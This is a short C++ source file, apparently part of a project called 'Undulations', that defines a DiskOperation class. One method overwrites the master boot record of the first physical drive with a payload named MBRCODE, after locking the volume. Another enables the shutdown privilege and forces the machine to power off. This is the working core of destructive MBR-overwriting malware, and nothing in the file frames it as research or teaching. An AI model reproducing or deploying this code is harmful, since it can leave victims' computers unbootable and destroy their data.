#include "Undulations.h"


bool DiskOperation::WriteMBR()
{
	memcpy(pMBR, MBRCODE, sizeof(MBRCODE));
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	hDevice = CreateFile(TEXT("\\\\.\\PHYSICALDRIVE0"),GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hDevice);
		return false;
	}
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	writeDevice = WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	if (writeDevice == NULL)
	{
		CloseHandle(hDevice);
		return false;
	}
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	CloseHandle(hDevice);
	return true;
}



void DiskOperation::ShutDown()
{
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tokenPrivileges.Privileges[0].Luid);

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, (PTOKEN_PRIVILEGES)NULL, NULL);
	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, NULL);
}
